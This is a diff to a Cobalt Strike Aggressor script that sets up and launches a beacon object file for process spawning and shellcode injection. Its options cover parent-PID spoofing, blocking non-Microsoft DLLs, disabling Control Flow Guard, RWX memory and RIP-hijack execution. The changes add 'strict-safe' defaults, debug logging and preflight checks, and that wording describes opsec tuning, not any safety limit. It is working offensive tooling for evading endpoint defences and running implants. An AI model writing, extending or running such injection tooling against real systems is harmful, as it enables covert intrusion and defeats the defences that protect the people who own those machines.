@@ -38,8 +38,9 @@ $working_dir = "C:\\Windows\\System32";
 $cmd_line = "C:\\Windows\\System32\\rundll32.exe";
 $block_dll = "true";
 $cfg_disable = "true";
-$use_rwx = "false";  # Changed default to false for better OpSec
-$exec = "Hijack RIP Callback";
+$use_rwx = "false";      # strict-safe default: RWX is manual opt-in
+$exec = "Hijack RIP Direct"; # strict-safe default: callback requires explicit opt-in
+$debug_mode = "false";
 
 # ================================================================
 # APPLY CONFIGURATION CALLBACK
@@ -56,15 +57,18 @@ sub ApplyConfig {
     $cfg_disable = $3['cfg_box'];
     $use_rwx = $3['use_rwx'];
     $exec = $3['execmem'];
+    $debug_mode = $3['debug_box'];
 
+    println("Profile:             strict-safe");
     println("Process name:        $process_spawn");
     println("Parent Process:      $parent_process");
     println("Working directory:   $working_dir");
     println("Command line:        $cmd_line");
     println("Block DLL policy:    $block_dll");
     println("Disable CFG:         $cfg_disable");
-    println("Use RWX:             $use_rwx");
+    println("Use RWX:             $use_rwx (manual opt-in)");
     println("Execution method:    $exec");
+    println("Debug diagnostics:   $debug_mode");
     println("=" x 60);
     println("[+] Configuration applied successfully\n");
 }
@@ -89,19 +93,21 @@ sub ProcessConfig {
         blockdll_box => $block_dll, 
         cfg_box => $cfg_disable, 
         use_rwx => $use_rwx, 
-        execmem => $exec), 
+        execmem => $exec,
+        debug_box => $debug_mode),
         &ApplyConfig);
 
     dialog_description($dialog, 
-        "Configure process spawning and injection parameters:\n\n" .
+        "Configure strict-safe process spawning and injection parameters:\n\n" .
         "Process Name:        Executable path to spawn (e.g., rundll32.exe)\n" .
         "Working Directory:   Current directory for spawned process\n" .
         "PPID Process:        Parent process name for PPID spoofing (empty = disabled)\n" .
         "CMD Line:            Command line arguments for spawned process\n" .
         "Block DLL Policy:    Restrict to Microsoft-signed DLLs only\n" .
-        "Disable CFG:         Disable Control Flow Guard (required for callback method)\n" .
-        "Use RWX:             Allocate memory as RWX (less stealthy but simpler)\n" .
-        "Execute Method:      Technique for shellcode execution"
+        "Disable CFG:         Required only for callback method\n" .
+        "Use RWX:             Manual opt-in (default remains RW->RX)\n" .
+        "Execute Method:      Default is Hijack RIP Direct (callback is opt-in)\n" .
+        "Debug Diagnostics:   Optional on-demand diagnostics (default is off)"
     );
     
     drow_text($dialog, "process_spawn", "Process Name:");
@@ -111,6 +117,7 @@ sub ProcessConfig {
     drow_checkbox($dialog, "blockdll_box", "Block Non-Microsoft DLLs");
     drow_checkbox($dialog, "cfg_box", "Disable CFG");
     drow_checkbox($dialog, "use_rwx", "Use RWX Memory");
+    drow_checkbox($dialog, "debug_box", "Enable Debug Diagnostics");
     drow_combobox($dialog, "execmem", "Execution Method:", 
         @("Hijack RIP Direct", "Hijack RIP Jmp Rax", "Hijack RIP Jmp Rbx", "Hijack RIP Callback"));
 
@@ -126,6 +133,76 @@ sub bool_to_int {
         return 0;
     }
     return 1;
+}
+
+# ================================================================
+# HELPER: PRINT RUNTIME POLICY SNAPSHOT
+# ================================================================
+sub print_policy_snapshot {
+    println("Block DLL:        $1");
+    println("Disable CFG:      $2");
+    println("Use RWX:          $3");
+    println("Execution:        $4");
+}
+
+sub debug_log {
+    if (bool_to_int($debug_mode)) {
+        println("[DBG] " . $1);
+    }
+}
+
+sub resolve_exec_method {
+    if ($1 iswm "Hijack RIP Direct") {
+        return 0;
+    } else if ($1 iswm "Hijack RIP Jmp Rax") {
+        return 1;
+    } else if ($1 iswm "Hijack RIP Jmp Rbx") {
+        return 2;
+    } else if ($1 iswm "Hijack RIP Callback") {
+        return 3;
+    }
+
+    return -1;
+}
+
+# ================================================================
+# HELPER: PREFLIGHT EXECUTION GUARDRAILS
+# ================================================================
+# CNA precondition gate runs before thread-context modification; BOF runtime check remains fail-closed backstop.
+sub preflight_validate_execution {
+    $bid = $1;
+    $exec_name = $2;
+    $cfg_int = $3;
+    $exec_method = $4;
+
+    if ($exec_method == -1) {
+        berror($bid, "unknown execution method '$exec_name' | next step: choose a supported execution method and retry");
+        return 0;
+    }
+
+    if ($exec_method == 3 && $cfg_int == 0) {
+        berror($bid, "callback blocked (cfg-disable is off) | next step: enable CFG-disable, then retry");
+        return 0;
+    }
+
+    if ($exec_method == 3 && $cfg_int == 1) {
+        debug_log("callback mode precondition satisfied (cfg-disable is on)");
+    }
+
+    return 1;
+}
+
+# ================================================================
+# HELPER: PACK BOF ARGUMENTS (CONTRACT-CRITICAL ORDER)
+# ================================================================
+sub pack_spawn_args {
+    # Keep this field order aligned with Src/Bof.c::go() parser:
+    # Z process | Z parent | Z cwd | Z cmd | i block_dll | i disable_cfg
+    # | i use_rwx | i exec_method | b shellcode
+    return bof_pack($1, "ZZZZiiiib",
+        $process_spawn, $parent_process, $working_dir, $cmd_line,
+        $2, $3, $4, $5,
+        $6);
 }
 
 # ================================================================
@@ -180,22 +257,15 @@ alias spawn_beacon {
     $temp_cfg_disable = bool_to_int($cfg_disable);
     $temp_use_rwx = bool_to_int($use_rwx);
 
-    # Map execution method string to integer
-    $temp_exec = 0;
-    if ($exec iswm "Hijack RIP Direct") {
-        $temp_exec = 0;
-    } else if ($exec iswm "Hijack RIP Jmp Rax") {
-        $temp_exec = 1;
-    } else if ($exec iswm "Hijack RIP Jmp Rbx") {
-        $temp_exec = 2;
-    } else if ($exec iswm "Hijack RIP Callback") {
-        $temp_exec = 3;
+    debug_log("spawn_beacon preflight: blockdll=$temp_block_dll cfg=$temp_cfg_disable rwx=$temp_use_rwx exec='$exec'");
+
+    # Resolve execution method string to integer (no fallback)
+    $temp_exec = resolve_exec_method($exec);
+    if (!preflight_validate_execution($1, $exec, $temp_cfg_disable, $temp_exec)) {
+        return;
     }
 
-    println("Block DLL:        $temp_block_dll");
-    println("Disable CFG:      $temp_cfg_disable");
-    println("Use RWX:          $temp_use_rwx");
-    println("Execution:        $temp_exec");
+    print_policy_snapshot($temp_block_dll, $temp_cfg_disable, $temp_use_rwx, $temp_exec);
 
     # Load BOF
     $bof_path = get_bof_path();
@@ -215,10 +285,7 @@ alias spawn_beacon {
     println("=" x 60 . "\n");
 
     # Pack arguments and execute
-    $args = bof_pack($1, "ZZZZiiiib", 
-        $process_spawn, $parent_process, $working_dir, $cmd_line, 
-        $temp_block_dll, $temp_cfg_disable, $temp_use_rwx, $temp_exec, 
-        $shellcode);
+    $args = pack_spawn_args($1, $temp_block_dll, $temp_cfg_disable, $temp_use_rwx, $temp_exec, $shellcode);
     
     beacon_inline_execute($1, $data, "go", $args);
 }
@@ -255,22 +322,15 @@ alias spawn_shellcode {
     $temp_cfg_disable = bool_to_int($cfg_disable);
     $temp_use_rwx = bool_to_int($use_rwx);
 
-    # Map execution method string to integer
-    $temp_exec = 0;
-    if ($exec iswm "Hijack RIP Direct") {
-        $temp_exec = 0;
-    } else if ($exec iswm "Hijack RIP Jmp Rax") {
-        $temp_exec = 1;
-    } else if ($exec iswm "Hijack RIP Jmp Rbx") {
-        $temp_exec = 2;
-    } else if ($exec iswm "Hijack RIP Callback") {
-        $temp_exec = 3;
+    debug_log("spawn_shellcode preflight: blockdll=$temp_block_dll cfg=$temp_cfg_disable rwx=$temp_use_rwx exec='$exec'");
+
+    # Resolve execution method string to integer (no fallback)
+    $temp_exec = resolve_exec_method($exec);
+    if (!preflight_validate_execution($1, $exec, $temp_cfg_disable, $temp_exec)) {
+        return;
     }
 
-    println("Block DLL:        $temp_block_dll");
-    println("Disable CFG:      $temp_cfg_disable");
-    println("Use RWX:          $temp_use_rwx");
-    println("Execution:        $temp_exec");
+    print_policy_snapshot($temp_block_dll, $temp_cfg_disable, $temp_use_rwx, $temp_exec);
 
     # Load BOF
     $bof_path = get_bof_path();
@@ -294,10 +354,7 @@ alias spawn_shellcode {
     println("=" x 60 . "\n");
 
     # Pack arguments and execute
-    $args = bof_pack($1, "ZZZZiiiib", 
-        $process_spawn, $parent_process, $working_dir, $cmd_line, 
-        $temp_block_dll, $temp_cfg_disable, $temp_use_rwx, $temp_exec, 
-        $shellcode);
+    $args = pack_spawn_args($1, $temp_block_dll, $temp_cfg_disable, $temp_use_rwx, $temp_exec, $shellcode);
     
     beacon_inline_execute($1, $data, "go", $args);
 }
